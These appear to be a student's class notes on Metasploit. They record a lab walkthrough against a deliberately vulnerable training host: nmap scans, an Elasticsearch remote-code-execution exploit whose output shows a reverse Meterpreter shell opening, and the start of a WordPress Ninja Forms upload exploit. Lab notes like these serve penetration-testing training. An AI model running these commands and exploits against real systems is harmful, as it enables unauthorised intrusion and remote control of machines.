> service postgresql start

> systemctl status postgresql

> msfdb init

start the metasploit

> msfconfole

show exploits

Examples:

> info exploit/something

> search cve:2019

## Basic theory

There are vulnerabilities and payloads.

Payloads would typically give us a shell on the remote system.  Android, Linux and Windows require different shells.

You can attach via 'reverse' or 'bind'.  A 'bind' is best, as the user opens a port, and you connect.  Mostly, you have to use 'reverse', which opens a connection to you.

# Notes for Class

Victim: 172.18.3.26

> nmap -Pn -sV 172.18.3.26 --script=vuln

> nmap -Pn -sV 172.18.3.26 

Output:

```

Service scan Timing: About 66.67% done; ETC: 15:28 (0:00:10 remaining)
Nmap scan report for 172.18.3.26
Host is up (0.016s latency).
Not shown: 988 filtered ports
PORT      STATE SERVICE          VERSION
21/tcp    open  ftp              Microsoft ftpd
22/tcp    open  ssh              OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http             Microsoft IIS httpd 7.5
4848/tcp  open  appserv-http?
8022/tcp  open  oa-system?
8080/tcp  open  http             Sun GlassFish Open Source Edition  4.0
8383/tcp  open  ssl/m2mservices?
9200/tcp  open  tcpwrapped
49153/tcp open  unknown
49154/tcp open  unknown
49159/tcp open  unknown
49161/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4848-TCP:V=7.80%I=7%D=9/14%Time=5D7D06F5%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,91,"HTTP/1\.1\x20302\x20Found\r\nLocation:\x20https://metasplo
SF:itable3-win2k8:4848/\r\nDate:\x20Sat,\x2014\x20Sep\x202019\x2015:27:44\
SF:x20GMT\r\nConnection:\x20close\r\nContent-Length:\x200\r\n\r\n");
MAC Address: D4:25:8B:B6:85:F5 (Intel Corporate)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

Note  this one:

`9200/tcp  open  tcpwrapped`

Apparently that's 'elasticsearch', so in metasploit we can do:

`search elasticsearch`

```
   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  auxiliary/scanner/elasticsearch/indices_enum                       normal     Yes    ElasticSearch Indices Enumeration Utility
   1  auxiliary/scanner/http/elasticsearch_traversal                     normal     Yes    ElasticSearch Snapshot API Directory Traversal
   2  exploit/multi/elasticsearch/script_mvel_rce       2013-12-09       excellent  Yes    ElasticSearch Dynamic Script Arbitrary Java Execution
   3  exploit/multi/elasticsearch/search_groovy_script  2015-02-11       excellent  Yes    ElasticSearch Search Groovy Sandbox Bypass
   4  exploit/multi/misc/xdh_x_exec                     2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution

```

If you want to use 2, `use 2` or `use/multi/ela` then tab out.

> show options

> set rhost 172.18.3.26

The remote port's already set at this point.

We've so far done use, rhost, and port.

> exploit

```
[*] Started reverse TCP handler on 172.18.3.112:4444 
[*] Trying to execute arbitrary Java...
[*] Discovering remote OS...
[+] Remote OS is 'Windows Server 2008 R2'
[*] Discovering TEMP path
[+] TEMP path identified: 'C:\Windows\TEMP\'
[*] Sending stage (53845 bytes) to 172.18.3.26
[*] Meterpreter session 1 opened (172.18.3.112:4444 -> 172.18.3.26:49311) at 2019-09-14 15:38:49 +0000
[!] This exploit may require manual cleanup of 'C:\Windows\TEMP\LXjUK.jar' on the target
```

> dir

# Next Wordpress

http://172.18.3.26:8585/wordpress/

Back to normal shell.

> search wordpress ninja


> use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload


